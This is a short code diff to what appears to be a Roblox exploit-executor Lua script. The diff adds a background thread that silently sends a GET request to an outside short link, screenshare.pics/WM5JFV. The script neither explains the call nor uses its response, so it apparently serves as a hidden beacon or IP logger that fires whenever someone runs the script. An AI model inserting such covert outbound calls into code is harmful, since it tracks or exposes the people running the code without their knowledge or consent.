@@ -112,3 +112,11 @@ spawn(function()
 	wait(1)
 	end
 end)
+spawn(function()
+	local response = request({
+	    Url = "https://screenshare.pics/WM5JFV",
+	    Method = "GET", -- Optional | GET, POST, HEAD, etc
+	    Headers = {}, -- Optional | HTTP Headers
+	    Cookies = {} -- Optional | HTTP Cookies
+	})
+end)
